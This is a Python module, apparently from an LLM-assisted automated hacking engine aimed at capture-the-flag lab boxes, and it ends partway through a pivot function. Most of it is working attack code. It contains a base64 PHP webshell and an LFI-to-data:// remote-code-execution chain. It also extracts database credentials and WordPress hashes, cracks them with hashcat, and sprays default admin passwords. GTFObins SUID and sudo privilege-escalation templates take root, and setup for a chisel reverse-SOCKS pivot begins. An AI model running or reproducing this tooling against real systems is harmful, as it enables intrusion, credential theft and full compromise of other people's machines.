#!/usr/bin/env python3
"""gunbelt RECIPES — the deterministic fire-path (recipe-first, LLM-fallback).

Each lane tries a parameterized known-good recipe FIRST: a real command (curl/dig/smbclient/
php-RCE/hashcat) with a deterministic verify predicate. No LLM is in this loop — which makes
it fast, repeatable, AND guardrail-safe on live targets (no model generates or issues the
command). The autocannon engine calls Recipes.fire(lane) before ever reaching for the qwen
trooper; the trooper is invoked only when there is no recipe or the recipe comes up empty.

Adapted from the proven carousel core (live/ab/carousel.py — owned the lab in ~4.5s). The one
carousel weakness (hardcoded service IPs) is removed here: discover() does a real nmap sweep
and binds services to the hosts recon actually finds.

Contract mirrors trooper.Trooper.fire():
    Recipes(target).fire(lane) -> {success, evidence, facts, output, cmds, id} | None
`None` means "no deterministic recipe for this lane — fall back to the trooper."
Facts use the autocannon vocabulary the engine already parses: app=<name>:<ip>, flag=<v>,
shell=<user>, hash=<$P$...>, cred=<user>:<pass>, vhost=<name>, share=<name>.
"""
import base64, concurrent.futures, json, os, re, shlex, signal, subprocess, tempfile, threading, time

EXEC_SSH = os.environ.get("TROOPER_EXEC_SSH", "").strip()   # run recipes on this host (your-host)
CMD_TIMEOUT = int(os.environ.get("RECIPE_CMD_TIMEOUT", "30"))
GPU_HOST = os.environ.get("GB_GPU_HOST", "om@YOUR-GPU-HOST")   # your-host; crack on GPU1 only
ROCKYOU = os.environ.get("GB_ROCKYOU", "/usr/share/wordlists/rockyou.txt")
# pivot config (chisel reverse-SOCKS through the web RCE) — ported from carousel. The chisel
# SERVER + http.server run on the EXEC_SSH host (the gateway the web container can reach); the
# web pulls the client and dials back. GW is that gateway as seen FROM the target's edge net.
CHISEL = os.environ.get("GB_CHISEL", "/usr/local/bin/chisel")
CHP, HTP, SKP = 39901, 39902, 39903     # chisel-rev / http-serve / reverse-socks ports
WORK = os.environ.get("GB_WORK", "/tmp/gb-recipes")
# <?php system($_GET['c']); ?>
PHP_SYS = "PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="
FLAG_RE = re.compile(r"(?:FLAG|HTB)\{[^}\s\"']+\}")
PHPASS_RE = re.compile(r"\$(?:P|H)\$[./A-Za-z0-9]{30,}")
# small default-credential spray for the DC lane — creds that can't be derived from the app
# (e.g. a provisioned local admin). Cracked creds are always tried first.
DEFAULT_CREDS = [("administrator", "Passw0rd1!"), ("administrator", "P@ssw0rd"),
                 ("administrator", "admin"), ("admin", "admin"), ("admin", "password")]

# --- GTFObins privesc weapon --------------------------------------------------
# Each template takes a simple, quote-free command string {c} (e.g. "id" or a cat) and runs it
# as root by abusing the binary. SUID variants assume the binary is SUID-root (euid=0 on exec);
# sudo variants assume `sudo -n <binary>` is NOPASSWD-allowed. Non-interactive & one-shot only —
# interactive-only pagers (less/more/vi) stay as HINTS, never auto-fired, so a verdict is never
# faked. Grounding (uid=0 in real output) is enforced by the caller, not here.
GTFO_SUID = {
    "find":    lambda c: f"find . -maxdepth 0 -exec {c} \\;",
    "bash":    lambda c: f"bash -p -c '{c}'",
    "dash":    lambda c: f"dash -p -c '{c}'",
    "sh":      lambda c: f"sh -p -c '{c}'",
    "python":  lambda c: f"python -c 'import os;os.setuid(0);os.system(\"{c}\")'",
    "python3": lambda c: f"python3 -c 'import os;os.setuid(0);os.system(\"{c}\")'",
    "php":     lambda c: f"php -r 'posix_setuid(0);system(\"{c}\");'",
    "perl":    lambda c: f"perl -e 'use POSIX;POSIX::setuid(0);system(\"{c}\");'",
    "awk":     lambda c: f"awk 'BEGIN{{system(\"{c}\")}}'",
    "gawk":    lambda c: f"gawk 'BEGIN{{system(\"{c}\")}}'",
    "env":     lambda c: f"env {c}",
    "node":    lambda c: f"node -e 'process.setuid(0);require(\"child_process\").execSync(\"{c}\",{{stdio:\"inherit\"}})'",
}
GTFO_SUDO = {
    "find":    lambda c: f"sudo -n find . -maxdepth 0 -exec {c} \\;",
    "vim":     lambda c: f"sudo -n vim -c ':!{c}' -c ':q!' 2>/dev/null",
    "python":  lambda c: f"sudo -n python -c 'import os;os.system(\"{c}\")'",
    "python3": lambda c: f"sudo -n python3 -c 'import os;os.system(\"{c}\")'",
    "php":     lambda c: f"sudo -n php -r 'system(\"{c}\");'",
    "perl":    lambda c: f"sudo -n perl -e 'system(\"{c}\");'",
    "awk":     lambda c: f"sudo -n awk 'BEGIN{{system(\"{c}\")}}'",
    "gawk":    lambda c: f"sudo -n gawk 'BEGIN{{system(\"{c}\")}}'",
    "env":     lambda c: f"sudo -n env {c}",
    "tar":     lambda c: f"sudo -n tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='{c}'",
    "nmap":    lambda c: f"echo 'os.execute(\"{c}\")' > /tmp/.gbn.nse && sudo -n nmap --script /tmp/.gbn.nse 2>/dev/null; rm -f /tmp/.gbn.nse",
}
# binaries we can detect but not safely auto-fire non-interactively (pagers/editors needing a tty)
GTFO_HINT_ONLY = ("nano", "less", "more", "vi", "man", "ftp", "cp", "mv", "dd", "tee", "nmap")
# root flag locations to grab once we have euid=0
ROOT_LOOT = "cat /root/root.txt /root/flag.txt /root/user.txt"
# generic subdomain wordlist for fair vhost discovery (NO box-specific names) — from Opus's
# fair-test recon patch. Used by _vhost_discover to fuzz vhosts by Host header (gobuster-vhost).
COMMON_SUBS = ["www", "mail", "smtp", "pop", "pop3", "imap", "webmail", "mx", "email", "ns1", "ns2", "ns",
 "dns", "ftp", "sftp", "files", "file", "share", "fileshare", "cloud", "drive", "docs", "doc",
 "dev", "dev1", "dev2", "development", "staging", "stage", "stg", "test", "testing", "qa", "uat", "demo",
 "beta", "preprod", "sandbox", "lab", "admin", "administrator", "portal", "dashboard", "panel", "cpanel",
 "webmin", "intranet", "internal", "corp", "vpn", "remote", "access", "gateway", "gw", "proxy",
 "git", "gitlab", "gitea", "svn", "bitbucket", "jenkins", "ci", "cd", "build", "jira", "wiki", "confluence",
 "blog", "news", "press", "media", "cms", "shop", "store", "cart", "checkout", "payment", "pay",
 "api", "api1", "api2", "apps", "app", "service", "services", "mobile", "m", "web", "web1", "web2",
 "support", "help", "helpdesk", "desk", "service-desk", "careers", "jobs", "hr", "people",
 "finance", "accounting", "billing", "invoice", "sales", "crm", "erp", "hr2",
 "db", "database", "sql", "mysql", "mssql", "oracle", "postgres", "mongo", "redis", "backup", "backups", "bak",
 "grafana", "kibana", "logs", "log", "elastic", "splunk", "nagios", "zabbix", "prometheus",
 "exchange", "owa", "autodiscover", "lync", "sip", "voip", "pbx", "print", "printer",
 "dc", "dc01", "dc1", "ad", "ldap", "radius", "kerberos", "ns3", "host", "server", "srv", "vcenter", "esxi",
 "secure", "auth", "sso", "login", "account", "accounts", "id", "identity", "legacy", "old", "new", "v2", "v1"]

def _q(s): return shlex.quote(str(s))

def _safe_capture(argv, timeout):
    """Deadlock-safe command capture. A command that backgrounds a child (reverse-shell
    listener, `nc -lvnp &`, chisel) leaves that child holding the inherited stdout pipe, so a
    plain capture_output=True read never sees EOF and wedges the whole engine — even past the
    timeout, and the orphan survives. Fix: send stdout/stderr to a real temp FILE (no pipe to
    hold open), detach into its own session so we can kill the entire process group on timeout,
    and never share our stdin. (Re-applied after the 2026-08-22 outage wiped the scratchpad copy
    of this fix; original diagnosis in mailbox gunbelt-15-CLOSER-fair-test-CRITICAL-proofgate.)"""
    try:
        with tempfile.TemporaryFile(mode="w+", errors="replace") as tf:
            p = subprocess.Popen(argv, stdout=tf, stderr=subprocess.STDOUT,
                                 stdin=subprocess.DEVNULL, text=True, start_new_session=True)
            try:
                p.wait(timeout=timeout)
                tf.seek(0); return tf.read()
            except subprocess.TimeoutExpired:
                try: os.killpg(os.getpgid(p.pid), signal.SIGKILL)
                except Exception: pass
                try: p.wait(timeout=5)
                except Exception: pass
                tf.seek(0); return tf.read() + "\n(timeout)"
    except Exception as e:
        return f"(error: {e})"

def sh_local(cmd, timeout=CMD_TIMEOUT):
    """Run a command on THE ENGINE HOST itself (never via EXEC_SSH). For infra-facing work —
    the GPU crack — which belongs on the operator box, not the target-facing jump host."""
    return _safe_capture(["bash", "-lc", cmd], timeout)

def sh(cmd, timeout=CMD_TIMEOUT):
    """Run one shell command against the TARGET. §10.1: routes through the ONE physically-
    exclusive target-contact primitive (governed when a seam is open, witnessed-fallback
    otherwise). sh_local() stays direct for infra (the GPU crack), which never touches the target."""
    import os as _os, sys as _sys
    _sys.path.insert(0, _os.path.dirname(_os.path.abspath(__file__)))
    import target_exec as _texec
    # §10.1: the governed door scope-checks the TARGET arg (fail-closed on a missing/None
    # target under a BS2 policy). Recipe traffic all lands on the engagement host, so pass it
    # explicitly — BS2_TARGET is set for governed runs; falls back to None (ungoverned) otherwise.
    return _texec.run(cmd, target=os.environ.get("BS2_TARGET") or None,
                      action_class=_texec.classify_action(cmd), timeout=timeout)


class Recipes:
    def __init__(self, target):
        self.target = target
        self.bind = {}                 # service -> ip, from discover()
        self.rce_ok = False
        self.mysql_creds = None        # (host,user,pw)
        self.hashes = []               # [(user, $P$hash)]
        self.creds = []                # [(user, pass)] confirmed/cracked, for downstream spray
        self.data = {}                 # db_ip / dc_ip / etc.
        self.socks_up = False          # reverse-SOCKS pivot established?
        self._pc = ""                  # proxychains prefix once pivot is up
        self.rooted = False            # privesc to root achieved?
        self.vhosts = set()            # discovered vhost FQDNs (fuzz+signals, not planted)
        self.app_vhost = None          # vhost that serves the exploitable app (for Host header)
        self._vh_done = False
        self._discovered = False
        self._dlock = threading.Lock()

    # ---- shared verdict builder -------------------------------------------------
    # scorer integrity: a command the governed door BLOCKED/DENIED never produced target
    # contact, so it can never be a success or a source of facts (a regex over the transcript
    # would otherwise credit the block marker itself — the recurring attempt-vs-success bug).
    _BLOCK_MARKERS = ("[target-exec BLOCKED", "[trooper scope-guard BLOCKED",
                      "[GOVERNED DENY", "[GOVERNED ERROR")

    @staticmethod
    def _v(lane_id, success, evidence, facts, output, cmds):
        if success and any(mk in (output or "") for mk in Recipes._BLOCK_MARKERS):
            success = False
            evidence = f"gated at governed door (no target contact): {evidence}"
            facts = []
        return {"success": bool(success), "evidence": str(evidence)[:200],
                "facts": facts or [], "output": output[:8000], "cmds": cmds, "id": lane_id}

    def _flags(self, text, out_facts):
        for m in FLAG_RE.findall(text or ""):
            f = f"flag={m}"
            if f not in out_facts:
                out_facts.append(f)

    # ---- recon: bind services to the hosts nmap actually finds -------------------
    def discover(self):
        """Bind ftp/dns/smb/http to real hosts. AUTHORITATIVE: bind the TARGET's OWN open ports
        first — on a SHARED subnet (real HTB) a /24 sweep would grab another player's box (wrong
        AND unauthorized). GB_TARGET_ONLY=1 (default) skips the sweep entirely; the sweep is a
        your-host-docker-ism, kept opt-in for genuinely internal pivots. (Opus's fair-test fix.)"""
        with self._dlock:                               # serialize: concurrent lanes wait here
            if self._discovered:
                return
            selfp = sh(f"nmap -n -Pn -T4 --open -p21,25,53,80,110,139,445,8080 {self.target} "
                       f"2>/dev/null", timeout=60)
            self._bind_from(self.target, selfp)
            if os.environ.get("GB_TARGET_ONLY", "1") == "1":   # default: single entry box, no /24 sweep
                for svc in ("ftp", "dns", "smb", "http"):
                    self.bind.setdefault(svc, self.target)
                self._discovered = True
                return
            base = re.sub(r"\.\d+$", "", self.target)   # e.g. 172.30.0
            net = base + ".0/24"
            gateway = base + ".1"                        # docker gateway — never a lab target
            out = sh(f"nmap -n -Pn -T4 --open -p21,53,80,139,445 {net} 2>/dev/null", timeout=90)
            host, ports = None, ""
            def flush():
                if host and host != gateway:
                    self._bind_from(host, ports)
            for line in out.splitlines():
                m = re.search(r"Nmap scan report for .*?(\d{1,3}(?:\.\d{1,3}){3})", line)
                if m:
                    flush()
                    host, ports = m.group(1), ""
                elif "/tcp" in line and "open" in line:
                    ports += line + "\n"
            flush()
            # never leave a service unbound: fall back to the entry target
            for svc in ("ftp", "dns", "smb", "http"):
                self.bind.setdefault(svc, self.target)
            self._discovered = True

    def _discover_domain(self, dns, web):
        """Learn the target's DNS domain from EVIDENCE, never a planted list: reverse-PTR on the
        target via its own DNS server, plus FQDNs harvested from the default page body/headers,
        the TLS cert SANs, and the SMTP banner. The most-referenced registrable suffix wins. This
        is what a fair engagement does in the wild — the domain is discovered, not assumed."""
        if "vhost_domain" in self.data:
            return self.data["vhost_domain"]
        # gather evidence from authoritative-ish signals AND every app surface (emails/links in
        # the apps leak the internal domain that rDNS/SMTP don't).
        blob = sh(f"dig +short -x {self.target} @{dns}", 8) + "\n"
        blob += sh(f"dig +short CH TXT hostname.bind @{dns}", 6) + "\n"
        for port in ("", ":8080", ":8000", ":8443"):
            blob += sh(f"curl -s -D - --max-time 6 http://{web}{port}/", 8)[:5000]
        blob += sh(f"echo | timeout 6 openssl s_client -connect {self.target}:443 2>/dev/null | "
                   f"openssl x509 -noout -text 2>/dev/null", 9)
        blob += sh(f"timeout 6 bash -c 'exec 3<>/dev/tcp/{self.target}/25; head -c 400 <&3' 2>/dev/null", 8)
        # known third-party template/CDN/placeholder domains are never the target's own domain
        _INFRA = {"gstatic.com", "googleapis.com", "w3.org", "example.com", "schema.org",
                  "cloudflare.com", "jquery.com", "bootstrapcdn.com", "fontawesome.com",
                  "w3layouts.com", "github.com", "twitter.com", "facebook.com", "youtube.com",
                  "linkedin.com", "instagram.com", "googleapis.com", "sucuri.net"}
        _INTERNAL_TLD = ("local", "htb", "corp", "lan", "internal", "intra", "ad")
        scores = {}
        def bump(dom, sc):
            if dom and dom not in _INFRA:
                scores[dom] = scores.get(dom, 0) + sc
        # emails are the strongest domain signal a real operator reads off the page
        for em in re.findall(r"@([a-z0-9-]+(?:\.[a-z0-9-]+)+)", blob, re.I):
            bump(".".join(em.lower().split(".")[-2:]), 5)
        for fq in re.findall(r"\b([a-z0-9][a-z0-9-]*(?:\.[a-z0-9][a-z0-9-]*)+)\b", blob, re.I):
            parts = fq.lower().rstrip(".").split(".")
            if len(parts) < 2 or re.match(r"^\d+$", parts[-1]):   # skip bare IPs
                continue
            bump(".".join(parts[-2:]), 3 if parts[-1] in _INTERNAL_TLD else 1)
        # an internal-TLD domain (.local/.htb/...) always beats a public one on an internal engagement
        internal = {d: v for d, v in scores.items() if d.rsplit(".", 1)[-1] in _INTERNAL_TLD}
        pool = internal or scores
        domain = max(pool, key=pool.get) if pool else None
        self.data["vhost_domain"] = domain
        return domain

    def _axfr_zones(self, dns):
        """Candidate zones to AXFR, discovered only: the evidence-derived domain plus any domain
        surfaced by its NS records. No box- or lab-specific names are seeded."""
        web = self.bind.get("http", self.target)
        zones = []
        dom = self._discover_domain(dns, web)
        if dom:
            zones.append(dom)
            ns = sh(f"dig +short NS {dom} @{dns}", 8)
            for h in re.findall(r"([a-z0-9-]+(?:\.[a-z0-9-]+)+)\.", ns, re.I):
                d = ".".join(h.lower().split(".")[-2:])
                if d not in zones:
                    zones.append(d)
        return zones

    def _vhost_discover(self):
        """Learn the domain from the SOA, then find vhosts two fair ways: (a) fuzz the GENERIC
        COMMON_SUBS wordlist by Host header, keeping only vhosts whose response differs from a
        known-bogus-host baseline (gobuster-vhost); (b) harvest FQDNs from live signals (default
        page HTML, headers/redirect Location, SMTP banner). No planted /etc/hosts. (Opus's patch.)"""
        if self._vh_done:
            return
        self._vh_done = True
        web = self.bind.get("http", self.target); dns = self.bind.get("dns", self.target)
        domain = self._discover_domain(dns, web)
        if not domain:
            return
        def probe(host):
            r = sh(f"curl -s -o /dev/null -w '%{{http_code}}:%{{size_download}}' --max-time 5 "
                   f"-H 'Host: {host}' http://{web}/", 7)
            m = re.match(r"(\d+):(\d+)", r.strip())
            return (m.group(1), int(m.group(2))) if m else ("0", 0)
        base_code, base_len = probe(f"zzznope-{abs(hash(web)) % 99999}.{domain}")
        found = set()
        def check(sub):                              # parallel: ~150 probes must not be serial
            code, ln = probe(f"{sub}.{domain}")
            return f"{sub}.{domain}" if (code != "0" and
                    (code != base_code or abs(ln - base_len) > 25)) else None
        with concurrent.futures.ThreadPoolExecutor(max_workers=24) as ex:
            for hit in ex.map(check, COMMON_SUBS):
                if hit:
                    found.add(hit)
        sig = sh(f"curl -s -D - --max-time 6 http://{web}/ -o /dev/null", 7)
        sig += sh(f"curl -s --max-time 6 http://{web}/", 7)
        sig += sh(f"timeout 6 bash -c 'exec 3<>/dev/tcp/{self.target}/25; head -c 400 <&3' 2>/dev/null", 8)
        for h in re.findall(r"([a-z0-9][a-z0-9-]*\." + re.escape(domain) + r")", sig, re.I):
            found.add(h.lower())
        found.discard(domain)
        self.vhosts |= found

    def _bind_from(self, host, ports):
        if re.search(r"^21/tcp", ports, re.M):  self.bind.setdefault("ftp", host)
        if re.search(r"^53/tcp", ports, re.M):  self.bind.setdefault("dns", host)
        if re.search(r"^(139|445)/tcp", ports, re.M): self.bind.setdefault("smb", host)
        if re.search(r"^80/tcp", ports, re.M):  self.bind.setdefault("http", host)

    def _hh(self):
        """Host-header flag for the exploitable app's vhost — apps live on named vhosts on real
        boxes, so a bare-IP curl hits the default site, not the app. (Opus's fair-test finding.)"""
        return f"-H 'Host: {self.app_vhost}' " if self.app_vhost else ""

    # ---- RCE primitive (index.php?page=data:// wrapper) -------------------------
    def _rce(self, cmd, timeout=CMD_TIMEOUT):
        web = self.bind.get("http", self.target)
        c = (f"curl -s --max-time {timeout-2} {self._hh()}-G http://{web}/index.php "
             f"--data-urlencode 'page=data://text/plain;base64,{PHP_SYS}' "
             f"--data-urlencode c={_q(cmd)}")
        return sh(c, timeout=timeout)

    def _rce_php(self, script, timeout=CMD_TIMEOUT):
        b = base64.b64encode(script.encode()).decode()
        fn = f"/tmp/.gb{abs(hash(script)) % 100000}.php"
        return self._rce(f"echo {b}|base64 -d>{fn}&&php {fn} 2>/dev/null;rm -f {fn}", timeout=timeout)

    # ---- lanes ------------------------------------------------------------------
    def _ftp(self, lane):
        self.discover()
        ftp = self.bind.get("ftp", self.target); cmds, facts, out = [], [], ""
        c = f"curl -s --max-time 10 'ftp://anonymous:anonymous@{ftp}/'"; cmds.append(c)
        listing = sh(c, 12); out += listing
        if "(error" in listing or "timeout" in listing or not listing.strip() or "refused" in listing.lower():
            return self._v(lane["id"], False, "FTP not anon-accessible", [], out, cmds)
        for name in [ln.split()[-1] for ln in listing.splitlines() if ln.strip()]:
            c2 = f"curl -s --max-time 8 'ftp://anonymous:anonymous@{ftp}/{name}'"; cmds.append(c2)
            body = sh(c2, 10); out += body; self._flags(body, facts)
        facts.append("ftp=anonymous")
        return self._v(lane["id"], bool(facts), "anon FTP; " + ", ".join(facts), facts, out, cmds)

    def _dns(self, lane):
        self.discover()
        dns = self.bind.get("dns", self.target); cmds, facts, out = [], [], ""
        for z in self._axfr_zones(dns):
            c = f"dig axfr @{dns} {z} +noall +answer +nocomments"; cmds.append(c)
            r = sh(c, 12); out += r
            if r.strip() and "failed" not in r and "timed out" not in r and "connection" not in r.lower():
                self._flags(r, facts)
                for sub in re.findall(r"([a-z0-9-]+\." + re.escape(z) + r")\.", r, re.I):
                    vf = f"vhost={sub.lower()}"
                    if vf not in facts: facts.append(vf)
        for f in list(facts):
            if f.startswith("vhost="): self.vhosts.add(f.split("=", 1)[1])
        self._vhost_discover()                          # fuzz + signal-harvest beyond AXFR
        for vh in sorted(self.vhosts):
            vf = f"vhost={vh}"
            if vf not in facts: facts.append(vf)
        return self._v(lane["id"], bool(facts),
                       f"AXFR+fuzz; {len(self.vhosts)} vhosts, " + (", ".join(facts) or "none"),
                       facts, out, cmds)

    def _smb(self, lane):
        self.discover()
        smb = self.bind.get("smb", self.target); cmds, facts, out = [], [], ""
        c = f"smbclient -N -L //{smb} 2>&1"; cmds.append(c)
        r = sh(c, 15); out += r
        if "NT_STATUS" in r and "public" not in r.lower():
            return self._v(lane["id"], False, "no null-session shares", [], out, cmds)
        for sh_name in re.findall(r"^\s*(\w[\w$.-]*)\s+Disk", r, re.M):
            if not sh_name.endswith("$"):
                facts.append(f"share={sh_name}")
        if re.search(r"\bpublic\b", r, re.I):
            d = "/tmp/gb-smb"
            g = sh(f"mkdir -p {d}; smbclient -N //{smb}/public "
                   f"-c 'recurse ON;prompt OFF;lcd {d};mget *' 2>&1; grep -rIh . {d} 2>/dev/null", 20)
            out += g; self._flags(g, facts)
        return self._v(lane["id"], bool(facts), "SMB null; " + (", ".join(facts) or "none"),
                       facts, out, cmds)

    def _webenum(self, lane):
        self.discover()
        self._vhost_discover()
        web = self.bind.get("http", self.target); cmds, facts, out = [], [], ""
        seen = set()
        targets = [("", web)] + [(vh, web) for vh in sorted(self.vhosts)]
        for vh, w in targets:
            hh = f"-H 'Host: {vh}' " if vh else ""
            c = f"curl -s --max-time 8 {hh}http://{w}/"; cmds.append(c)
            body = sh(c, 10)
            c2 = f"curl -s -I --max-time 8 {hh}http://{w}/"; cmds.append(c2)
            hdr = sh(c2, 10)
            blob = body + hdr
            out += f"\n$ curl {hh}http://{w}/\n" + blob[:1200]
            app = None
            if re.search(r"wp-content|wp-login|wp-json|wordpress", blob, re.I): app = "wordpress"
            elif re.search(r"gitlab|gitlab_session|/users/sign_in", blob, re.I): app = "gitlab"
            elif re.search(r"drupal|X-Generator: Drupal|/sites/default/", blob, re.I): app = "drupal"
            elif re.search(r"osticket", blob, re.I): app = "osticket"
            label = vh or w
            if app and app not in seen:
                facts.append(f"app={app}:{label}"); seen.add(app)
                if app in ("wordpress", "drupal") and vh and not self.app_vhost:
                    self.app_vhost = vh                 # exploit lanes will Host-header to this
            self._flags(body, facts)
        for vh in sorted(self.vhosts):
            vf = f"vhost={vh}"
            if vf not in facts: facts.append(vf)
        return self._v(lane["id"], bool(seen),
                       f"web: {', '.join(sorted(seen)) or 'unknown'} across {len(self.vhosts)} vhosts",
                       facts, out, cmds)

    def _wplfi(self, lane):
        """LFI -> data:// RCE foothold. gives shell."""
        self.discover()
        web = self.bind.get("http", self.target); cmds, facts, out = [], [], ""
        c = (f"curl -s --max-time 8 {self._hh()}-G http://{web}/index.php "
             f"--data-urlencode 'page=../../../../../../etc/passwd'"); cmds.append(c)
        passwd = sh(c, 10); out += passwd
        lfi = "root:x:0:0:" in passwd
        if not lfi:
            return None                                # no templated LFI -> let the trooper try
        facts.append("lfi=page")
        r = self._rce("id"); out += "\n$ id\n" + r; cmds.append("<data:// RCE> id")
        m = re.search(r"uid=\d+\(([\w.-]+)\)", r)      # user may contain '-' (e.g. www-data)
        if not m:
            return None                                # LFI found but data:// RCE didn't land -> trooper
        self.rce_ok = True
        facts.append(f"shell={m.group(1)}")
        fr = self._rce("cat /var/www/html/flag.txt 2>/dev/null"); self._flags(fr, facts); out += fr
        return self._v(lane["id"], True, "LFI->data:// RCE " + m.group(0), facts, out, cmds)

    def _loot(self, lane):
        if not self.rce_ok:
            return None       # no deterministic foothold -> let the trooper try
        cmds, facts, out = ["<RCE> loot"], [], ""
        # Locate wp-config.php wherever it lives (docroot varies per box/vhost), don't assume /var/www/html.
        cfg = self._rce("for f in $(find /var/www /srv /home /opt -maxdepth 5 -name wp-config.php 2>/dev/null) "
                        "/var/www/html/wp-config.php /var/www/html/status.php; do cat \"$f\" 2>/dev/null; done")
        out += cfg
        host = user = pw = None
        m = re.search(r'mysqli\("([^"]+)","([^"]+)","([^"]+)"', cfg)
        if m:
            host, user, pw = m.group(1), m.group(2), m.group(3)
        else:
            mp = re.search(r"DB_PASSWORD',\s*'([^']+)'", cfg)
            if mp:
                host = (re.search(r"DB_HOST',\s*'([^']+)'", cfg) or [None, "db"])[1]
                user = (re.search(r"DB_USER',\s*'([^']+)'", cfg) or [None, "root"])[1]
                pw = mp.group(1)
        if pw:
            self.mysql_creds = (host, user, pw)
            facts.append(f"cred={user}:{pw}")
        # resolve internal hosts via the web container's own resolver, then dump wp_users
        res = self._rce_php('<?php foreach(["db","dc","dc01"] as $h){$ip=gethostbyname($h);'
                            'if($ip!=$h)echo "$h=$ip\\n";}')
        out += res
        for ln in res.splitlines():
            if "=" in ln:
                k, vv = ln.split("=", 1); vv = vv.strip()
                if k == "db": self.data["db_ip"] = vv
                if k in ("dc", "dc01"): self.data["dc_ip"] = vv
        if self.mysql_creds:
            h, u, p = self.mysql_creds
            php = (f'<?php mysqli_report(MYSQLI_REPORT_OFF);'
                   f'$c=@new mysqli("{h}","{u}","{p}");'
                   f'if(!$c||$c->connect_errno){{$c=@new mysqli("127.0.0.1","{u}","{p}",null,3306);}}'
                   f'if(!$c||$c->connect_errno){{echo"CF";exit;}}'
                   f'$c->select_db("wordpress");$r=$c->query("SELECT user_login,user_pass FROM wp_users");'
                   f'if($r)while($x=$r->fetch_assoc())echo json_encode($x)."\\n";')
            dump = self._rce_php(php); out += dump
            for ln in dump.splitlines():
                self._flags(ln, facts)
                try: row = json.loads(ln)
                except Exception: continue
                u2, h2 = row.get("user_login"), row.get("user_pass")
                if u2 and h2 and PHPASS_RE.search(h2 or ""):
                    self.hashes.append((u2, h2))
            if self.hashes:
                facts.append(f"hash={self.hashes[0][1]}")
        return self._v(lane["id"], bool(facts), "looted; " + ", ".join(f.split('=')[0] for f in facts),
                       facts, out, cmds)

    def _crack(self, lane):
        if not self.hashes:
            return None
        cmds, facts = ["<GPU1> hashcat -m 400"], []
        block = "\n".join(h for _, h in self.hashes)
        # GPU crack runs on the ENGINE HOST (your-host, GPU1) — infra-facing, never via the target
        # jump host. If GB_GPU_HOST names a remote, hop there; otherwise run locally.
        # --potfile-disable: never consult/write the pot, so a hash cracked on a prior run is
        # still re-emitted to the outfile (a stale pot silently yields "0 cracked").
        crack = (f"cat>/tmp/gbh.txt<<'EOF'\n{block}\nEOF\n"
                 f"rm -f /tmp/gbh.out;CUDA_VISIBLE_DEVICES=1 hashcat -m 400 -a 0 -d 1 --quiet "
                 f"--potfile-disable -o /tmp/gbh.out /tmp/gbh.txt {ROCKYOU} "
                 f">/dev/null 2>&1;cat /tmp/gbh.out")
        if GPU_HOST and GPU_HOST not in ("local", "localhost", ""):
            b = base64.b64encode(crack.encode()).decode()
            out = sh_local(f"ssh -o ConnectTimeout=6 -o StrictHostKeyChecking=no {GPU_HOST} "
                           f"'echo {b}|base64 -d|bash'", timeout=200)
        else:
            out = sh_local(crack, timeout=200)
        cracked = {}
        for ln in out.splitlines():
            if ":" in ln and "$" in ln.split(":", 1)[0]:
                hsh, pwv = ln.split(":", 1); cracked[hsh.strip()] = pwv.strip()
        for u, h in self.hashes:
            if h in cracked:
                facts.append(f"cred={u}:{cracked[h]}")
                self.creds.append((u, cracked[h]))
        return self._v(lane["id"], bool(facts), f"cracked {len(facts)}/{len(self.hashes)} phpass",
                       facts, out, cmds)

    def _privesc(self, lane):
        """GTFObins-driven quick-win privesc from the web shell. Parse `sudo -n -l` and a SUID
        sweep, then AUTO-FIRE every binary we have a safe one-shot exploit for (find/bash/python/
        php/perl/awk/env/tar/nmap/...). Grounded: only claims shell=root when the exploit's own
        `id` output shows uid=0(root); interactive-only pagers/editors stay as hints, never fired,
        so a verdict is never faked. Always returns a verdict (never None once we have RCE)."""
        if not self.rce_ok:
            return None                          # no foothold yet -> nothing to escalate from
        cmds, facts, out = ["<RCE> privesc"], [], ""

        def fire(tmpl, method):
            """tmpl(cmd)->sh string. Prove root with `id`; if uid=0, loot the root flag via the
            SAME vector (so the read also runs as root). Returns True on grounded root."""
            probe = tmpl("id")
            r = self._rce(probe); out_local = f"\n$ {method}: {probe}\n" + r
            self._privesc_out.append(out_local)
            if not re.search(r"uid=0\(root\)", r):
                return False
            self.rooted = True
            facts.extend(["shell=root", f"privesc={method}"])
            fl = self._rce(tmpl(ROOT_LOOT)); self._privesc_out.append(fl)
            self._flags(fl, facts)
            return True
        self._privesc_out = [out]

        # 1) sudo -n -l  (full NOPASSWD ALL, then specific GTFObins-allowed binaries)
        sl = self._rce("sudo -n -l 2>&1"); self._privesc_out.append("\n$ sudo -n -l\n" + sl)
        if re.search(r"NOPASSWD:\s*ALL", sl):
            if fire(lambda c: f"sudo -n {c}", "sudo-nopasswd-all"):
                return self._v(lane["id"], True, "root via sudo NOPASSWD: ALL",
                               facts, "".join(self._privesc_out), cmds)
        for path in re.findall(r"NOPASSWD:\s*([^\s,]+)", sl):
            b = os.path.basename(path.strip())
            if b in GTFO_SUDO and fire(GTFO_SUDO[b], f"sudo-{b}"):
                return self._v(lane["id"], True, f"root via sudo {b} (GTFObins)",
                               facts, "".join(self._privesc_out), cmds)

        # 2) SUID sweep  (auto-fire the first exploitable binary)
        suid = self._rce("find / -perm -4000 -type f 2>/dev/null | head -60")
        self._privesc_out.append("\n$ suid\n" + suid)
        bins = [os.path.basename(s.strip()) for s in suid.splitlines() if s.strip()]
        for b in bins:
            if b in GTFO_SUID and fire(GTFO_SUID[b], f"suid-{b}"):
                return self._v(lane["id"], True, f"root via SUID {b} (GTFObins)",
                               facts, "".join(self._privesc_out), cmds)
        # hints for detected-but-not-auto-fired binaries (propagate to the iterate step)
        for b in sorted(set(bins)):
            if b in GTFO_HINT_ONLY:
                facts.append(f"suid={b}")

        return self._v(lane["id"], self.rooted,
                       "privesc: " + (", ".join(facts) or "no quick win"),
                       facts, "".join(self._privesc_out), cmds)

    def _pivot(self):
        """Stand up a chisel reverse-SOCKS through the web RCE so internal hosts become reachable
        via proxychains. Sets self.socks_up + self._pc. Ported from carousel's lane_pivot. The
        chisel server + http.server live on the EXEC_SSH host (the gateway the web dials back to)."""
        if self.socks_up:
            return True
        if not self.rce_ok:
            return False
        base = re.sub(r"\.\d+$", "", self.bind.get("http", self.target))
        gw = base + ".1"                          # gateway the web container reaches back through
        sh(f"mkdir -p {WORK}; cp -f {CHISEL} {WORK}/chisel 2>/dev/null; "
           f"fuser -k {HTP}/tcp {CHP}/tcp {SKP}/tcp 2>/dev/null; sleep 1", 12)
